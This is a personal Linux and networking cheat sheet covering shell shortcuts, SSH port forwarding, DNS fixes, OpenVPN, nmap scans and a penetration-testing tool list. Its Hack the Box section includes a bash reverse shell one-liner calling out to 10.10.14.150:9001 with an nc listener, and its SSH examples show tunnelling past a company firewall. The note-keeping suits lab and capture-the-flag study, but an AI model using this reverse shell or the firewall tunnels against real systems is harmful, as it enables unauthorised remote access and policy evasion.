
### Common commands
```sh
$ hostname                   # show or set system's hostname
$  history | grep netstat    # search the command  history
$ cd -                       # navigate to previous directory
$ Ctrl + A                   # navigate to start of command
$ Ctrl + E                   # navigate to the end of command
$_ shell variable            # in bash, is the last argument given to the previous command
!$ shell variable            # in bash, gives the last argument of previous command in the shell history
mkdir -p a/b/c/d/e && cd $_  # create folder and switch to it
$! shell variable            # the PID of the last executed command
du -ch                       # estimate file space usage
su -                         # switch to root user
tar -xvf file.tar            # extract file
```



### SSH Port Forwarding

**Local port forwarding:** lets you connect from your local computer to another server.
* **Example1**: you need to connect from your company computer to your home computer,
but the RDP port (3389) is blocked by company firewall 
on the WORK:   ```ssh -L 8181:<home_ip>:3389  <home_ssh_user>@<home_ip>```
then - access RDP connection with localhost:8181 (from WORK)


**Reverse Port Forwarding**: Remote port forwarding lets you connect from the remote SSH server to another server.
you need to connect from your home computer to your  company computer,
on the WORK:   ```ssh -R 8181:localhost:3389  <home_ssh_user>@<home_ip>```
then - access RDP connection with localhost:8181  (from HOME)

Good explanation (from https://unix.stackexchange.com/questions/46235/how-does-reverse-ssh-tunneling-work)
* **local: -L Specifies that the given port on the local (client) host is to be forwarded to the given host and port on the remote side.**
```ssh -L sourcePort:forwardToHost:onPort connectToHost``` means: connect with ssh to ```connectToHost```, and forward all connection attempts to the **local** ```sourcePort``` to port ```onPort``` on the machine called ```forwardToHost```, which can be reached from the ```connectToHost``` machine.


* **remote: -R Specifies that the given port on the remote (server) host is to be forwarded to the given host and port on the local side.**
```ssh -R sourcePort:forwardToHost:onPort connectToHost``` means: connect with ssh to ```connectToHost```, and forward all connection attempts to the **remote** ```sourcePort``` to port ```onPort``` on the machine called ```forwardToHost```, which can be reached from your local machine.


**Dynamic Port forwarding**: Dynamic port forwarding turns your SSH client into a SOCKS proxy server.
* **Example1**: on the work machine there is a filter on the port 80 
```ssh -D 8181 <home_ssh_user>@<home_ip>```
the will need to change Chrome setings to point to the created proxy



### Network commands
```sh
$ ifconfig                   # configure/view network interfaces
$ ping -c 5 www.google.com   # ping 5 times
$ arp                        # manipulate the system ARP cache
```


### Magic bytes
* https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance/
* Example: 
 ```$ echo "GIF8;" > testfile.file```
 ```$ file testfile.file```   # outputs  **testfile.file: GIF image data**



### Hack the box
https://0x00sec.org/t/my-hackthebox-ctf-methodology-from-fresh-box-to-root/13980

**Bach reverse shell**
* https://github.com/fijimunkii/bash-dev-tcp/blob/master/reverse-shell
Example: ```bash -i >& /dev/tcp/10.10.14.150/9001 0>&1```   plus   ```nc -lvnp 9001``` to listen


### DNS configuration issues

**ping: www.google.com: Temporary failure in name resolution**

* https://stackoverflow.com/questions/53687051/ping-google-com-temporary-failure-in-name-resolution
* https://www.tecmint.com/set-permanent-dns-nameservers-in-ubuntu-debian/
 
    On modern Linux systems that use systemd (system and service manager), the DNS or name resolution services are provided to local applications via the systemd-resolved service. 
    It uses the systemd DNS stub file (**/run/systemd/resolve/stub-resolv.conf**) in the default mode of operation.
    The DNS stub file contains the local stub **127.0.0.53** as the only DNS server.
    
    ```ls -l /etc/resolv.conf``` - you will see that this file is a symlink to the /run/systemd/resolve/stub-resolv.conf file.
    Unfortunately, because the /etc/resolv.conf is indirectly managed by the systemd-resolved service, any changes made manually by a user can not be saved permanently or only last for a while.
    
    Quick fix - just to modify the **/etc/resolv.conf** to 8.8.8.8



## Open VPN server
Install and configure 
* https://interface31.ru/tech_it/2019/10/nastroyka-openvpn-servera-dlya-dostupa-v-internet.html  (russian)

**restart**
```
sudo systemctl stop openvpn@server
sudo systemctl enable openvpn@server.service
sudo systemctl start openvpn@server
```


## Start a python2 web server

 ``` python -m SimpleHTTPServer 80```
 
 
 ## Pen Testing
 * **Target validation** - WHOIS, nslookup, dnsrecon
 * **Finding subdomains** - Google Fu, dig, Nmap, Sublist3r, Bluto, crt.sh, etc
 * **Fingerprinting** - nmap, Wappalyzer, BuiltWith, Netcat
 * **Data Breaches** - HaveIBeenPwned and similar
 * **Also** - Nikto, Nessus, Burp Suite, dirbuster, searchsploit, metasploit, 
 * parsing leaked credentials - https://github.com/hmaverickadams/breach-parse

### nmap (press UP key to see the status)
* **TCP**  - SYN - SYN ACK - ACK 
* **nmap** -  SYN - SYN ACK - RST
1. **nmap "ping scan"** - ``` nmap -sn 10.0.2.0/24```  show all the nodes in a network
2. ```nmap -T4 <host>``` - top 1000 widely used ports scanned 
3. ```nmap -T4 -p- <host>``` - all ports scanned 
4. ```nmap -sC -sV -oA output <host>``` - this seems faster 
5. ```nmap -T4 -p22,80,443 <host>``` - selective ports scanned (can add here ```-A``` for more info)
6. ```/usr/share/nmap/scripts``` - nmap usefull scripts (example  ```nmap -p443 --script=ssl-enum-ciphers utm.md```)


